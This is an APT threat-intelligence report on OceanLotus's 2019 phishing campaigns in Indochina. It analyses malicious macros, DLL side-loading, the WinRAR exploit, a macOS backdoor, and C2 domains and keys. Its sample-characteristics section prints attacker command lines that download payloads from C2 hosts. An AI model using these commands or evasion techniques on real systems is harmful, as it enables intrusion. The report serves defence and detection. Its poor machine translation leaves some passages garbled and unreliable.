The group was first\nrevealed and named by SkyEye Team in May 2015. Its attack activities can be traced\nback to April 2012. The targets include China's maritime institutions, maritime\nconstruction, scientific research institutes and shipping enterprises.\n\nIn fact, according to reports of various security vendors, OceanLotus also attacked\nseveral countries, including Cambodia, Thailand, Laos, even some victims in Vietnam,\nlike opinion leaders, media, real estate companies, foreign enterprises and banks.\n\n\n-----\n\nRedDrip Team (formerly SkyEye Team) has been to OceanLotus to keep track of high\nstrength, groupactivity, found it in the near future to Indochinese Peninsula countries\nsince 2019 the latest attack activity used in the initial launch load files and attack using\nthe technology, and combined with the QiAnXin threat intelligence data, associated with\na series of attacks.\n\nIn this report, we share our summary of the latest attack techniques, attack payloads and\nrelated attacks of the OceanLotus, hoping that we can jointly improve understanding of\nOceanLotus group, an extremely active APT group.\n\n## Attacks on Countries\n\nThe following is a list of typical cases of attacks against some countries on Indochinese\nPeninsula since the end of 2018. For other unmentioned samples, please refer to the\nIOC list at the end of this report.\n\n### Vietnam\n\n#### Bait Compression Files\n\nOn April 1, 2019, RedDrip discovered a Vietnamese file name \"Hop dong sungroup.rar\"\nin the process of daily monitoring the attack activities of the OceanLotus.\n\nThe English version is \"Sun Group contract\". The compressed package contains\nwinword.exe which is renamed as “Noi dung chi tiet hop dong sungroup can chinh sua”.\n\nIn addition, we are also associated with another package decoy\nSUN_GROUP_CORPORATION that translates as \"Sun Group Corporation\". The file\nname in the zip package is as follows:\n\nNoi dung can xac thuc va sua GUI den CONG TY CO PHAN TAP DOAN MAT TROI Bo\nTai chinh. exe\n\nIt turned out that Sun City Group was actually one of the largest real estate developers\nin Vietnam.\n\n\n-----\n\nBoth samples were uploaded by Vietnam. Therefore, we speculate that the OceanLotus\nGroup in the Sun City internal staff fishing attacks.\n\nIn addition to targeting the Vietnamese real estate industry, we also found that the group\nwould conduct phishing attacks against the national bank of Vietnam:\n\nThe compressed package of the related samples is called cplh-nhnn-01-209.rar. The\ncorresponding date of the samples is January 22, 2019, and the attack is most likely to\noccur in a similar period.\n\nThe Chinese name of the compressed package is: \"national bank of Vietnam -- 01209.rar\";The winword. Exe in the package was renamed \"chiphilienhoannhnnbc209.exe\", which translated as \"state bank of Vietnam sbv-bc 209.exe\".\n\nSBV refers to Vietnam's central bank, the state bank of Vietnam (SBV), while BC actually\nrefers to B2C, or third-party payment.\n\nThis attack is likely to be launched against the bank's internal staff, similar to the\ndocument transmission process disguised as a third-party payment within the bank.\n\nIn addition, there are anti-virus software related information through the disguise of\nfishing.\n\n\n-----\n\nCompressed package name: Gui lai cho MS.MAI post content kaspersky. Rar (return\nMS.MAI post content kaspersky)\n\nWe also see oil as a theme for fishing:\n\n\"Tinh dau can mua\" (essential oil required), the PE file in the package is called \"details\nabout purchase and purchase\"\n\n#### Bait Documents\n\nThe above compression package contains the Kaspersky name bait, and there is also a\nsimilar name \"Content marketing kaspersky.doc\" in the bait document. After opening the\ndocument, it will be shown as follows, enabling the macro attack method for the\nVietnamese version of the induced click.\n\nIn addition, we also found a large number of OceanLotus disguised as a resume attack\nfishing activities, we internally named it OceanCV activity, and this activity will directly\nOceanLotus commonly used three macro attack means all exposure.\n\nFirst of all, we analyze the sample names. It can be seen that the sample names all start\nwith CV and have the characteristics of naming. There are three main types:\n\n1, CV- name (e.g., cv-nguyenquynhchi.docx)\n\n2. CV- name - position (e.g. CV-AnthonyWei- customerservice. docx)\n\n3. CV- random number + English (e.g. Cv-103237-ewqdsd.doc)\n\nIt is worth noting that some samples will show the identity indicating the need to enable\nmacro after opening:\n\n\n-----\n\nHowever, when you pull down the progress bar, you will find resumes written in\nVietnamese, which is true for most of the samples in the series of activities, and the\nresumes are inconsistent.\n\nAnd these sample phishing resumes use different methods.Some use the OceanLotus\nMSO macro (RedDrip internally named MSOMacro)\n\nSome use template injection techniques:\n\n\n-----\n\nSome use the technique of converting macro code to a 1-pound font hidden in a\ndocument (later upgraded to a white 1-pound font, internally named OHNMacro for\nRedDrip).\n\nIn the following sections we will examine each of these three macro usage analyses in\ndetail.\n\nAccording to this batch of resume samples, we conducted homologous sample\ncorrelation for these three macro documents, combined with various dimensions, and\nfinally found a large number of exclusive malicious macro samples of OceanLotus.\nPlease refer to the relevant section of Office samples for details.\n\n#### Exploit Vulnerabilities of Eternal Blue\n\nWe also found that OceanLotus used the \"Eternal blue\" series of vulnerabilities to target\ncompanies in Vietnam that provided software to the government.\n\nWebsite: [https://www.tandan.com.vn/portal/home/default.aspx](https://www.tandan.com.vn/portal/home/default.aspx)\n\nTAN DAN JSC for Vietnam's software company.\n\n\n-----\n\n**The company will provide the government with mail servers, official gazette**\n**database systems, citizenship management systems and more.**\n\nAfter the attack is successful, it will distribute Trojan horses. In the report \"suspected\" of\n\"OceanLotus\" organization's early attack activities against domestic colleges and\nuniversities \"compiled by us last year, the Trojan horses used eternal blue to attack\ncolleges and universities are consistent.\n\n[https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-university/](https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-university/)\n\n#### Phishing Attacks by Exploiting WinRAR Vulnerability\n\n\n-----\n\nIn addition to traditional malicious payloads that take advantage of black and white\nmechanisms, malicious payloads that infiltrate tweets and websites, OceanLotus also\ntakes advantage of the latest Winrar vulnerability to launch attacks against Vietnam.Here\nis one of the cases we captured:\n\nThe package name is \"tut_photoshop_scan_bank_id.rar\"\n\nFrom the sample trigger vulnerability extract file, its name is called CocCocUpated. Exe\n\nCOCCOC is a Vietnam was founded in 2013 as a new technology company, provides\nonline Internet search engine services and browsers, the main language used in\nVietnamese and English, the search service is Vietnam's most mature, browser is based\non Google Chromium development, support Windows, iOS platform.\n\nThrough analysis, we found that it was the early Trojan framework of OceanLotus, and\nwe also put it in the section of sample analysis for separate analysis.\n\nBait, of course, in addition to the above, we also found that the OceanLotus will use\ncompressed package embedded MP4 way exploit, compressed package name\ntranslated roughly \"Cho exclusive blockbuster movie\" Ray hospital, including Cho Ray\nrefers to ho chi minh city, Vietnam water wok hospital (ChợRẫy), ho chi minh city,\nVietnam's largest general hospital.\n\n\n-----\n\nThe package contains two MP4 files, one of which is identical to the package name, and\na video translated as \"the team began staffing after the exclusive stroke press release.\n\nSimilarly, released for coccocupdate.exe\n\nAnd its distribute means is the way that USES network dish to undertake putting\nhowever.\n\n\n-----\n\nThis new Trojan horse will be analyzed in detail in the section of sample analysis.\n\n#### MAC Backdoor\n\nIn addition to targeting Vietnam on the Windows platform, OceanLotus also attacks\nVietnamese users on the MacOS platform. The following samples are typical of recent\nlaunches, which use such means as browser update, Flash installation update package,\nfont installation package, disguised as a document to actually attack the installer.\n\nInterestingly, when we were analyzing the samples disguised as Firefox, it would show\nthe interface of installing Firefox after opening. Double-click the icon of Firefox, and the\nTrojan horse would be executed:\n\n\n-----\n\nWhen you click on the update, even if you are disconnected from the Internet, the\ndownload progress bar will appear.\n\nThis is the fake interface the attacker drew:\n\nSimilarly, in the following chapters, this batch of MacOS samples targeted at Vietnam\nwere extended for analysis.\n\n### Cambodia\n\nHere is this year's latest attack on Cambodia by OceanLotus, called \"report-no.0162(02\nPages).doc.\"\n\nThe sample operation process is shown in the following figure:\n\n\n-----\n\nThe samples associated by homology are as follows:\n\nMD5 Filename Create time\n\n\n56b5a96b8582b32ad50d6b6d9e980ce7 Request Comment on\nUYFC.doc\n\n\n2019-03-18\n04:12:00\n\n\n3fd2a37c3b8d9eb587c71ceb8e3bb085 No.039714(cdri).doc 2019-03-25\n04:33:00\n\nThe associated sample for the Cambodia attack Request Comment on uyfc.doc.\n\nThe UYFC is actually a Cambodian youth federation, the | UYFC ngo, which attacks\npeople who might be associated with the conference.\n\nDocument screenshot:\n\nNo.039714(cdri).doc\n\n\n-----\n\nIt is clear that the attack on Cambodia also used OHN macros.\n\nIn addition to scanning documents, last year hilina also Scanned Cambodia using\nMacOS samples. Related sample: \"Scanned Investment report-july 2018.zip\"\n\n### Thailand\n\nThe typical examples of attacks by OceanLotus against Thailand since 2019 are as\nfollows\n\nMD5 Filename Create\ntime\n\n\n4c30e792218d5526f6499d23\n5448bdd9\n\nd8a5a375‐\nda7798be781cf3ea689ae7ab\n\n\nForm_Provisional Agenda of the ASEAN\nSenior Officials Preparatory Meeting.doc\n\n\nProgram Retreat.doc 2019-0114\n03:50:00\n\n\n2019-0121\n02:25:00\n\n\nIt is named Form_Provisional Agenda of the ASEAN Senior Officials Preparatory\nMeeting.\n\nActually, the meeting was successfully held in Thailand on April 6, 2019. From the\ncreation time and upload time of the document (2019-03-22), it can be seen that\nOceanLotus has a strong ability to obtain current affairs and a long preparatory cycle.\n\nThe second document, Program Retreat, may target the military, but the broader\nmeaning of the name does not make the attacker's heart sink.\n\nBesides, the document contents of the two files in the above table are the same. The\nfollowing is the screenshot after restoring the shellcode font in the document:\n\n\n-----\n\nIt also USES OHN macros.\n\n## Sample Analysis\n\n### MSO Macro Documents\n\nThe \"MSO macro\" of OceanLotus has commonality. We analyzed one sample, and it can\nbe seen that the extracted macro code is as follows:\n\nFirst it adds the Data through the Data variable, and then after base64 decryption,\ndecrypts the VBS code, releases it into the msohtml.log, and copies wscript. Exe into\nWindows \\SysWOW64\\msohtml.exe:\n\nExecute the msohtml.log script by copying msohtml.exe (that is, wcript.exe), as shown in\nthe figure below:\n\n\n-----\n\nAnd create scheduled tasks:\n\nThe contents of the msohtml.log script are as follows. It will execute the data in the cs\narray after xor 518:\n\nThe decrypted script, as shown in the figure, will execute the malicious code after the\nelements in the cs array xor 415:\n\n\n-----\n\nAfter decryption of malicious code as shown in figure: will be downloaded from\n[https://open.betaoffice.net/cvfemale.png code and execution.](https://open.betaoffice.net/cvfemale.png)\n\n### OHN Macro Documents\n\nExtract the macro code from the sample, open the word document, it will prompt to\nenable the macro, after enabling the macro will execute this function:\n\nThen it will copy its office document to temp and name it random, as shown in the figure:\n\nThen modify the security of the registry macro:\n\nTake the data in the last five paragraphs of the total number of paragraphs (5\nparagraphs in total, 2 blank lines, 3 with hex data), convert it from hex to bin, add it to\nthe macro code of the new file, and then set the x_N0th1ngH3r3 method to execute the\nmacro code after 1 second:\n\n\n-----\n\nThe format file is 1 pound text, which cannot be seen by the naked eye, as shown in the\nfigure:\n\nThe first paragraph clears the data after formatting:\n\n\n-----\n\nAfter the data is converted into bin, it will be converted into the second macro code, and\nthe first macro code will execute the x_N0th1ngH3r3 function, as shown in the figure:\n\n\n-----\n\nExecute the macro code of penultimate paragraph 3 in the same way, as shown in the\nfigure:\n\n\n-----\n\nIt also starts with this function:\n\nTake the data of the penultimate paragraph, as shown in the figure:\n\nThe data are as follows:\n\nThen write to memory for execution:\n\n\n-----\n\nAfter the data hex is converted into bin, shellcode which is mostly used by OceanLotus is\nshown as follows:\n\nConfiguration file:\n\n\n-----\n\nThis is the way that shellcode is loaded with three macros, mostly to combat shellcode\nstatic killing.\n\n### Template Injection Documents\n\nThe template injection class document of OceanLotus has universality, after the\ndocument starts, it will load XXX.XXX/XXX. PNG\n\nAnd do the following.\n\nTo give an example of one of these attacks, fdsw.png is an office compound document:\n\n(d497bd06b34a046841bb63d3bf20e605)\n\nIf SysWOW64\\cmd.exe file exists, the system is either 32-bit or 64-bit.\n\nDepending on the system, the file is taken out of the cell, base64 decoded, and dropped\nto: %appdata% main_background-png:\n\nThe hijacked csids are \"{2dea658f-54c1-4227-af9b-260ab5fc3543}\".\n\n\n-----\n\nAccording to this CSID, it is the CSID of the DLL that is hijacked:\n%SystemRoot%\\System32\\ playsndsrv.dll\n\nThis DLL is used to play sound.\n\nThe extraction content of base64 content in the cell is as follows:\n\nBase64 decodes one of the 32-bit PE, Dllmain will apply 0x34aca byte memory space,\nand then write the shellcode at 0x10012760 into memory, and execute it through the\nthread:\n\nShellcode goes to the pointer at offset 0xfc8 when the parameter is passed to the\nfunction of sub_160018:\n\n\n-----\n\nThe address offset 0xfc8 holds the command line argument and a PE:\n\nThe function of sub_160018 is mainly to load the following PE in memory, and then pass\nthe command line to execute according to the command line parameters. The figure\nbelow is the code of receiving the command line parameters for the PE:\n\nRequest the URL, the downloaded data, after DES decryption, in memory load up.\n\n\n-----\n\nFind more samples through association analysis:\n\nSort by compile time as follows:\n\nAccording to the table comparison, the command line of the first sample is different from\nother samples. It can be known that it should be the sample of different attacks. This\nsample is the annotated version, which will load shellcode in memory in the same way.\n\nThe PE included in the file is found in a hacker's toolkit. The file name is CMD [w7][x64].\n\nThe function of this sample is to execute the McOds. Exe (this is the exe file name of the\nwhite utility program used by OceanLotus) through the CMD [w7][x64]. Exe contained in\nthe file, while the McOds. Exe should be the file released by the dropper before.\n\nThe upload place of this sample is VN, the upload time is July 31, and the file name is\nmsvchr.exe, we can know that this sample should be aimed at Vietnam attack:\n\n\n-----\n\nThrough the analysis and comparison of these samples, we can know that these\nsamples should be used to specifically execute exe file in memory, and pass command\nline parameters of the Loader program, is the last six months to use the new malicious\ncode framework, specifically used to develop against static kill.\n\nIt is found that two samples are 10M, and the end is filled with 0x20 (space), which is\nfilled into a large file to avoid being uploaded:\n\nAnd the way shellcode is loaded for these samples is a little different:\n\n1. Most samples are executed shellcode by creating threads\n\n2, compile the earliest version of the sample, in the form of services, with comments, in\nserviceMain create thread execution shellcode\n\n3. A small part of samples execute shellcode directly on the main thread\n\n\n-----\n\n### wwlib DLL Injection\n\nThrough the analysis of the compression package cplh-nhnn-01-2019. Rar downloaded\nby amazon AWS, it is found that the compression package packages winword.\n\nThey use winword. Exe white use technology, winword. Exe will load the same directory\nby default wwlib. DLL;\n\nThe reason why winword. Exe white use technology, because winword. Exe icon is the\nicon of word, and wwlib.dll is hidden, so they only need to change winword.\n\nWwlib. DLL malicious code in the FMain export function, winword. Exe will open the\ndefault call FMain this export function, malicious code will be executed;Then base64\ndecodes the shellcode that comes with it and executes it in the main thread:\n\nLocation of base64-encoded shellcode in the sample:\n\n\n-----\n\nIt is found that the decoded shellcode and the previous shellcode are loaded in the same\nway. The data offset 0x6b6 is passed to the sub_16 function as the parameter:\n\nThe function sub_16 is used to decrypt the data following 0x6b6, decrypt the second\nshellcode and execute it. The figure below is the second shellcode decrypted:\n\nThe second shellcode shellcode by DES declassified out the third layer, the key to\n\"asfahdiuqhu93ye7891h9ubioufcf\" :\n\n\n-----\n\nThe third layer of shellcode in front of the entrance and two shellcode entry is the same,\nalso call/pop way find shellcode the positions of the loaded into memory, and then take\nthe code at the back of the data (0 x8c6 offset) when the parameters are passed to the\nsub_16 function, parameters passed as: HTTPS: / / office.allsafebrowsing.com/AwPT:\n\nThe shellcode from HTTPS: / / office.allsafebrowsing.com/AwPT download files, and\nthen performed in the memory, the image below to download the file using the UA:\n\n\n-----\n\nThe downloaded AwPT file from cobaltstrike is the shellcode module:\n\n\n-----\n\nThe following figure shows the algorithm to decrypt the attached data at the end. Like\nthe shellcode module from cobaltstrike, the difference from before is that the shift moves\n8 bytes backward:\n\n\n-----\n\nThe decrypted data is a beacon module, as shown in the figure:\n\nExtract the configuration file information as follows:\n\n### MAC Backdoor\n\nThe analysis object is a MAC backdoor disguised as a browser.\n\nThe extracted file structure is as follows, which is a macOS installation package, as\nshown in the figure:\n\n\n-----\n\nAfter opening it, the interface for installing Firefox will be displayed. Double-click the\nFirefox icon, and the Dropper process will be executed:\n\nIt will pop up the interface of fake FireFox and click update. Even if the Internet is\ndisconnected, the download progress bar will appear, which is forged by the attacker:\n\nThis is the fake interface the attacker drew:\n\n\n-----\n\nAfter running, Dropper will create the following APP in the Library directory to start up:\n\n/ Users/username/Library/LaunchAgents/com, apple. Spell. Agent. The plist\n\nThe app in the startup directory to the directory: /\nUsers/username/Library/Spelling/spellagentd file, the file in OSX bin file, code did add\ncase processing, will decrypt the shellcode in memory and execute, as shown in figure:\n\n\n-----\n\nAfter execution back to the address: rio.imbandaad.com, through a Post request packets\nsent to the server: http://rio.imbandaad.com/v3/yQ/r/eiCu1gd6Qme.js\n\nBut the address is no longer valid. The signature information of the App is as follows:\n\n### CocCocUpdate\n\nCocCocUpdate is a Dropper that is released into the startup directory using a\ncompression package constructed by cve-2018-20250 vulnerability. The screenshot of\nthe compression package is as follows:\n\n\n-----\n\nAfter restart, it will be executed by the system, and the corresponding file is\ncoccocupdate.exe. We have exposed a Dropper version of random key passing through\ncommand line parameters in 2015. This coccocupdate.exe is improved to pass random\nkey through environment variables.\n\nThe specific steps are as follows:\n\n1. Gets the full path of the executed coccocupdate.exe in an environment variable\n\nwith a value of \"C091A8C8\" for later reading.\n\n1. Randomly generate a 128-byte key and store it in an environment variable with a\n\nvalue of \"DB99050C\";Used to encrypt the shellcode data that follows them.\n\n\n-----\n\n1. Encrypt the data at 0x40E000 by random key, and write the modified PE file to\n\nTemp directory, and then execute it through CreateProcess:\n\n\n-----\n\nThe following figure shows the comparison between the original file and the encrypted\nfile. It can be seen that there is no change in the code segment, except that the array of\nglobal variables 0xd000 is encrypted by the random key.\n\n1. If the file is bundled, it will decrypt and release a bundled file (the key is in the last\n\n64 bytes) from a resource of resource type 10 and resource number 1, such as a\n\n\n-----\n\nWord document or a normal file, and then execute it through ShellExectue. The file\ndoes not use the decoy file to release the bundled file, so the ID is wrong:\n\n5. The executed temp process will first determine whether there are environment\nvariables of \"C091A8C8\" set, if any\n\nIf it is encrypted by the original Dropper, it will read the randomly generated 128-bit key\nfrom the \"DB99050C\" environment variable, decrypt the code at 0x40e000, and then\ndecrypt one more layer and decompress one more layer, because the code has one\nlayer of encryption and compression in the original Dropper:\n\n\n-----\n\nExtract:\n\n6. The decrypted file is a PE file, which will be executed in memory after decryption, as\nshown in the figure:\n\n\n-----\n\nThis code will release 3 files to c:\\program files\\ Microsoft \\ Windows \\system restore\\\ndirectory:\n\nThen create the service and point to the rstrui.exe file:\n\n\n-----\n\nRstrui. Exe is an attacker to write a loader, disguised Microsoft Windows System Restore\nicon:\n\nMainly responsible for loading {9fbaa883-1709-4de3-8c1b-48683f740a5f} in the same\ndirectory through rundll32.\n\n\n-----\n\nFile name {9fbaa883-1709-4de3-8c1b-48683f740a5f}. Clsid file when a DllLoader, PE\ninformation is as follows:\n\nThe function of this DLL is mainly to decrypt and load shellcode with the same directory\nname as {9fbaa883-1709-4de3-8c1b-48683f740a5f}, as shown in the figure:\n\nEnter the sub_10001480 function, the contents of the file will be decrypted, and the PE\nwill be loaded in memory:\n\n\n-----\n\nThe PE after decryption in memory is shown in the figure below:\n\nDllMain creates a thread to execute the export function Version. In the Version function,\nthe remote control function will be executed all the time. If it fails, the sleep 6s will\ncontinue.\n\n\n-----\n\nThen a number less than 4 will be randomly generated, and C2 will be randomly\nselected, as shown in the figure:\n\nOne of the functions to decrypt C2 is as follows:\n\n\n-----\n\nThe 4 domain names are as follows:\n\nimages.ucange.com\n\npreload.ointalt.com\n\nmaintenance.allidayser.com\n\nreport.cottallid.com\n\nThe hash of the sample associated with the domain name is as follows:\n\n2 ea902abe453b70cf77e402cc16eb552\n\ncc7b9ee1b026e16a9d37e3988a714479\n\ne60c35dd36c9f525007955e6b3a88b82\n\nBinding files in this homologous sample:\n\nCc7b9ee1b026e16a9d37e3988a714479 bundled office files content is as follows:\n\n\n-----\n\nTranslation:\n\n2 ea902abe453b70cf77e402cc16eb552 bundled Office files content is as follows:\n\nTranslation:\n\nThe flow chart of the Dropper is as follows:\n\n\n-----\n\nA comparison between this version of Dropper and the 2015 version of Dropper:\n\n1. The Dropper in 2015 is to pass the randomly generated decryption key through the\ncommand line parameter, while the Dropper in this version is to pass the key through the\nenvironment variables between the process chains (API is SetEnvironmentVariableW\nand GetEnvironmentVariableW).\n\n2, the presence of the 2015 version of the detection virtual machine, this version does\nnot exist in the detection virtual machine.\n\nThe following figure is: Dropper version of OceanLotus in 2015 passes the key through \"\n- ping\" :\n\nThe following figure is: in this Dropper version, the randomly generated key is stored in\nthe environment variable:\n\n\n-----\n\n## Correlation Analysis\n\n### Trojan Samples\n\nThrough the analysis of the general backdoor of OceanLotus, a large number

we found that the resolved IP of C2:rio.imbandaad.com was\n198.15.119.125.When we checked the IP again, we found that one of the domain\nnames, web.dalalepredaa.com, had been labeled as OceanLotus\n\n\n-----\n\nAnd through this domain name, we discovered a OceanLotus's newest MAC sample.\n\nTo disguised as a document, first of all, the sample will be in the folder name in docx d,\nlowercase Roman numeral five hundred instead, to deceive users: Don khieu nai. ⅾ ocx\n\nWindows looks like this:\n\nOn the Macosx system is the office icon of the docx file, is actually a directory:\n\n\n-----\n\nBecause iconFile in info.plist points to the iconFile of a doc, as shown below:\n\nThe following is the signature information of the sample, as shown in the figure:\n\nAfter the sample is executed, three directories will be created in the Library directory:\n\nLaunchAgents\n\n\n-----\n\nMedia\n\nVideo\n\nInstall an application named LaunchAgents to start up:\n\nThe application points to the mediaagentd program in the Video directory:\n\nAt the same time, the previous directory was replaced by a real docx file, to achieve a\n\ndiversion:\n\n\n-----\n\nThe released mediaagentd program is shelled and will be loaded and executed in\nmemory after decryption:\n\nThe unshelled MACOS file is as follows:\n\n\n-----\n\nAt the entrance of the file, there will be a while loop, which will collect computer\ninformation and send it, enter the loop function of remote control, sleep for a random\nperiod of time, and continue the repeated process:\n\nMany of the internal strings are encrypted. The following is where the encryption function\nis used:\n\nThe decryption method is mainly through CCCrypt, and the algorithm is aes, iv is 0, as\nshown in the figure:\n\n\n-----\n\nAES encryption key (HEX) : 4 e620abedafb4d9866cc9d9c2d29e2d7ea18adf1 32-bit\nzero padding enough:\n\nThe decrypted data is as follows:\n\nAnd the information collected is encrypted by AES and sent through the CURL library:\n\n\n-----\n\nThe message distribution function of remote control is as follows: different operations will\nbe performed according to its own token in the first place. The following is the operation\nof listing the directory:\n\nThe key used for data transmission is different from the key used for decryption string.\nThe following is the encryption key for data transmission:\n\n07e74ff2ce9688c8f79b91ab32c95d11c140d3ac\n\nAnd some string decryption algorithms use base64 decryption first, then aes decrypt:\n\n\n-----\n\nBut the base64 used in the decryption is not the standard base64. The following figure\nshows the base64 table of the malicious code:\n\nhe encrypted data is sent to C2, as shown in the figure below:\n\nC2: web.dalalepredaa.com\n\nIt is worth noting that some of the recent Mac samples of hibiscus were found to have\nsignatures. After deduplication, we found two commonly used ones:\n\nMelinda Cline (P74QRJXB2F)\n\nDAVID DOWELL (B5YH6VDVRE)\n\n### Office Documents\n\nThrough correlation analysis, it is found that the macro document sample and a large\nnumber of samples have the same origin.\n\nAs can be seen from the comparison case below, the content of the document was\ncreated at the same time and by the same author.\n\n\n-----\n\nThe following figure is the template feature, template file name is very OceanLotus\ncharacteristics.\n\nAfter analysis, we found that we summarized the author names commonly used in the\nattack documents of OceanLotus, among which the largest attack activities were \"DEV\"\nactivity and \"Tushar\" activity.\n\n\n-----\n\nAfter correlation analysis of various dimensions, the document name and Hash value\ninvolved in this series of malicious macro file launching activities can be obtained.\n\nThe document name\n\nThe document name MD5\n\nTest.

There are some documents showing the startup of the induction macro, which are\ninconsistent with the previous induction interface.\n\n\n-----\n\nIn addition, historical samples are also different from the latest sample technology. As\nshown below, some historical samples do not use template injection technology, but use\ndirect macro code execution method, and the code to be executed is shown in the\ndocument content, namely the OHN macro code mentioned in the section of sample\nanalysis.\n\n**After correlation analysis of the macro samples mentioned above, it can be found**\n**that the earliest such attack was in 2017. The bait document uploaded by Vietnam**\n**was a test sample with a high probability from the file name.**\n\nSAMPLES 08 _11__12_2017 (317).\n\nc4d35f3263fef4a533e7403682a034c3\n\n4, the highest frequency of the Vietnamese file protection bait series\n\n\n-----\n\n### Compression Files\n\nIn the process of analyzing a Thu moi 209.rar sample of OceanLotus, we found that the\ngeneration time of the sample was suspected to be a custom suspect\n\nAs seen from the upload time of the sample, the upload time to VT is March 1, 2019, and\nthe time difference in the compressed package is too large.\n\nTherefore, after correlation capture of this time, we found multiple correlation samples of\nOceanLotus.\n\nThe file name MD5\n\n60982849 - c8e4-4039-8 f59 - dfb78d8bab0d\n\n15 f5adf1-8798-49 bf - a6c3d90b69e b666-4 bcbc1bef20d2befdd290e31269e0174a\n\n4052 d2e7 - cd4 ca42-4-8841-52 f782bba411 dfaa343552e8d470096a0a09a018930f\n\nFfea6446 - e47 ab7a - 4 - b7ff - e461f9775177 9 b1ce9df321ce88ade4ff3b0ada5d414\n\n\n5 d47e097 - c3bc - 401 - e - 8 c0f e877280b368a\n\n\nda14eece6191551a31d37d1e96681cd1\n\n\nThu moi 2019.

In attacks, the group\nwas always changing baits, payloads, AV evasion techniques, even domain names\nassets are constantly evolving, reflects a very strong ability to fight and attack will.\n\nTherefore, when we are tracking the attack activities of OceanLotus against China, we\nextend our understanding of the TTP of this notorious group. This process will never\nend.\n\n## IOCs\n\nDomain names:\n\nsyn.servebbs.com\n\nword.webhop.info\n\nbeta.officopedia.com\n\noutlook.updateoffices.net\n\noutlook.betamedias.com\n\noutlook.officebetas.com\n\noffice.allsafebrowsing.com\n\nopen.betaoffice.net\n\ncortanazone.com\n\nb.cortanazone.com\n\ncortanasyn.com\n\napi.blogdns.com\n\ndominikmagoffin.com\n\nblog.artinhauvin.com\n\nworker.baraeme.com\n\nkingsoftcdn.com\n\nstyle.fontstaticloader.com\n\nplan.evillese.com\n\nbluesky2018man.com\n\nenum.arkoorr.com\n\nbackground.ristians.com\n\n\n-----\n\npong.dynathome.net\n\nzone.servehttp.com\n\ncdn.eworldship-news.com\n\napi.blogdns.com\n\nonline.stienollmache.xyz\n\nimage.fontstaticloader.com\n\nmappingpotentials.com\n\nvnbizcom.com\n\ncdn3.onlinesurveygorilla.com\n\neworldship-news.com\n\nenormousamuses.com\n\n163mailservice.com\n\nstackbio.com\n\nmailserviceactivation.com\n\nweb.dalalepredaa.com\n\nrio.imbandaad.com\n\np12.alerentice.com\n\nBait files\n\nfd128b9f0cbdc374227cf5564371aacc\n\n4a0144c7436e3ff67cf2d935d82d1743\n\n4c30e792218d5526f6499d235448bdd9\n\nd8a5a375da7798be781cf3ea689ae7ab\n\n2d3fb8d5b4cefc9660d98e0ad46ff91a\n\n89e3f31c6261f4725b891c8fd29049c9\n\n7b0e819bd8304773c3648ab03c9f182a\n\nc4d35f3263fef4a533e7403682a034c3\n\nb1df440e5dd64ffae9f7e792993f2f4c\n\na76be0181705809898d5d7d9aed86ee8\n\n2785311085b6ca782b476d9c2530259c\n\n60501717f81eacd54facecf3ebadc306\n\n\n-----\n\n3d7cd531d17799832e262eb7995abde6\n\nc7931fa4c144c1c4dc19ad4c41c1e17f\n\nCorrelated files:\n\n5c9ef8b5263651a08ea1b79057a5ee28\n\nb858c08cf7807e462ca335233bd83fe7\n\nc313f8a5fd8ca391fc85193bc879ab02\n\n473fdfefa92725099ca87e992edbc92c\n\n02cec2f17a7910b6fa994f340bbbc297\n\ndd5ae0c0a7e17d101f570812fec4e5e4\n\n90e5ff68bf06cb930ed8c040139c4650\n\n6db450c4c756071ecafff425d6183d7d\n\ncb39e2138af92c32e53c97c0aa590d48\n\n8e13895504e643cd8e0e87377b25bd6b\n\nd3c27f779d615a1d3a35dff5e9561eb0\n\n27425360d18feea54860420006ea9833\n\ncf0142da12509f544a59093495c3a6dd\n\nb1df440e5dd64ffae9f7e792993f2f4c\n\n878fa022bd5e5caf678fe8d728ce42ee\n\nf78be074f6bc67a712e751254df5f166\n\ne2aed850c18449a43886fc79b342132f\n\n74b456adf2ae708789fb2d34ecccb954\n\n72263750df84e24fe645206a51772c88\n\n3a574c28beca4f3c94d30e3cf3979f4c\n\nee836e0f7a40571523bf56dba59898f6\n\nf6068b672a19ce14981df011a55081e4\n\n00ac0d7337290b74bdd7f43ec4a67ddb\n\nCorrelated PE files:\n\n2f9af6b9d73218c578653d6d9bd02d4d\n\nc9d29501410e19938cd8e01630dc677b\n\n\n-----\n\nURL:\n\nhttp[:]//downloadattachments.s3.amazonaws.com/db08b565038ac83e89e7b55201479f37ea49e525/f0c6ea8ed2f8-445f-b649-57808b2015b7\n\nSample characteristics\n\nZA:\\Code\\Macro_NB2\\Request\\PostData32.exe -u https://word.webhop.info/blak32.gif -t\n200000\n\nZA:\\Code\\Macro_NB2\\Request\\PostData32.exe -u https://syn.servebbs.com/kuss32.gif -t\n200000\n\nUA:\\Code\\Nb2VBS\\Request\\PostData32.exe -u https://ristineho.com/threex32.png -t\n60000\n\nXA:\\Code\\Macro_NB2\\Request\\PostData32.exe -u https://cortanasyn.com/kirr32.png -t\n200000\n\nC:\\Users\\WIN7UTL64\\Desktop\\Macro_NB2_new\\Request\\PostData32.exe\n\n{C:\\Users\\WIN7UTL64\\Desktop\\Macro_NB2_new\\Request\\PostData32.exe -u https://of‐\nfice.allsafebrowsing.com/fdsw32.png -t 240000\n\nSecurityAndMaintenance_Error.bin\n\nd:\\work\\malware\\vinacap\\SecurityAndMaintenance_Error.png\n\nd:\\work\\forensics\\vinacap\\dfir\\nhule\\files\\SecurityAndMaintenance_Error.png\n\nD:\\work\\forensics\\vinacap\\DFIR\\Nhule\\files\\SecurityAndMaintenance_Error.png\n\n：\nMAC signatures\n\nMelinda Cline (P74QRJXB2F)\n\nDAVID DOWELL (B5YH6VDVRE)\n\n：\nAES KEY\n\nDecrypted String 4E620ABEDAFB4D9866CC9D9C2D29E2D7EA18ADF1\n\nEncrypted Packet 07E74FF2CE9688C8F79B91AB32C95D11C140D3AC\n\n## References\n\n[1] [https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-university/](https://ti.qianxin.com/blog/articles/oceanlotus-targets-chinese-university/)\n\n[2] [https://twitter.com/blackorbird/status/1118399331688570880](https://twitter.com/blackorbird/status/1118399331688570880)\n\n[3] 